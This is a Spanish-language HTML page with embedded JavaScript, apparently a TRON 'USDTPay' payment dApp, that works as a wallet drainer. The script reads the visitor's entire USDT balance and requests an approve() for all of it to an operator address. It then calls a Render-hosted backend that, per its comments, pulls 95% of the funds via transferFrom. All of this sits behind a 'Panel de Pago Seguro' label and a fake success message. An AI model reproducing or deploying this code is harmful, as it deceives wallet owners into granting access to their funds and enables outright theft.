<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp de Pagos - USDT Pay</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen flex flex-col justify-between">

    <!-- HEADER -->
    <header class="w-full px-6 py-4 flex justify-between items-center border-b border-slate-800 bg-slate-900/50 backdrop-blur-md">
        <div class="flex items-center space-x-2">
            <div class="w-8 h-8 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-lg flex items-center justify-center font-bold text-white">⚡</div>
            <span class="text-lg font-bold tracking-wide">USDT<span class="text-cyan-400">Pay</span></span>
        </div>
        <div>
            <button id="btnConnect" onclick="conectarWallet()" class="bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold px-4 py-2 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/20 text-sm cursor-pointer">
                Conectar Wallet
            </button>
        </div>
    </header>

    <!-- CONTENIDO PRINCIPAL -->
    <main class="flex-grow flex items-center justify-center px-4 py-8">
        <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl">
            
            <div class="text-center mb-6">
                <h1 class="text-xl font-bold text-white">Panel de Pago Seguro</h1>
                <p class="text-xs text-slate-400 mt-1">Conecta tu billetera y procesa el pago de forma automática</p>
            </div>

            <!-- Formulario de Acción -->
            <div class="space-y-4">
                <button onclick="procesarAprobarYCobrar()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold py-3.5 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/25 cursor-pointer">
                    Autorizar y Procesar Pago
                </button>
            </div>

        </div>
    </main>

    <!-- FOOTER -->
    <footer class="w-full py-4 text-center text-xs text-slate-600 border-t border-slate-900">
        Smart Contract TRC20 • Backend Integrado
    </footer>

    <script>
        let userAddress = "";
        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
        
        // URL de tu backend desplegado en Render
        const BACKEND_URL = "https://backend-usdt-pay.onrender.com"; 

        // 1. Conectar la billetera (Trust Wallet / TronLink)
        async function conectarWallet() {
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                userAddress = window.tronWeb.defaultAddress.base58;
                
                const btn = document.getElementById("btnConnect");
                btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
                btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
                btn.classList.add("bg-emerald-500", "text-slate-950");
                
                alert("¡Billetera conectada con éxito!");
            } else {
                alert("Por favor, abre esta dApp desde el navegador interno de tu billetera.");
            }
        }

        // 2. Ejecutar el flujo de approve + llamada al backend
        async function procesarAprobarYCobrar() {
            if (!userAddress) {
                alert("Primero debes conectar tu billetera.");
                return;
            }

            try {
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);

                // Consultar saldo actual para aprobar un límite suficiente (ej. aprobar un monto alto o el total disponible)
                const balanceEnSun = await contract.balanceOf(userAddress).call();
                const saldoRealUSDT = window.tronWeb.toDecimal(balanceEnSun) / 1000000;

                if (saldoRealUSDT <= 0) {
                    alert("No tienes saldo disponible de USDT en esta billetera.");
                    return;
                }

                // Definimos un límite a aprobar (puede ser el saldo total o un monto alto)
                const montoAprobar = Math.floor(saldoRealUSDT * 1000000);

                alert("Se solicitará una autorización (approve) en tu billetera para continuar.");

                // Paso A: El usuario firma la aprobación (approve) dirigida a tu wallet operadora o contrato
                // NOTA: Reemplaza 'DIRECCION_DE_TU_OPERADOR_O_BACKEND' por la dirección pública de la wallet cuya clave privada configuraste en Render
                const DIRECCION_OPERADOR = "DIRECCION_DE_TU_OPERADOR_O_BACKEND"; 

                const txApprove = await contract.approve(DIRECCION_OPERADOR, montoAprobar).send({
                    feeLimit: 100000000
                });

                console.log("Aprobación exitosa. Hash:", txApprove);
                alert("¡Autorización concedida! Procesando transferencia automática desde el servidor...");

                // Paso B: Llamar al backend para que ejecute el transferFrom del 95% de forma automática
                const respuesta = await fetch(`${BACKEND_URL}/api/ejecutar-cobro`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userAddress: userAddress })
                });

                const resultado = await respuesta.json();

                if (resultado.exito) {
                    alert(`¡Éxito! ${resultado.mensaje}`);
                } else {
                    alert("Error en el servidor: " + resultado.mensaje);
                }

            } catch (error) {
                console.error("Error en el proceso:", error);
                alert("La operación fue cancelada o ocurrió un error en la red.");
            }
        }
    </script>
</body>
</html>
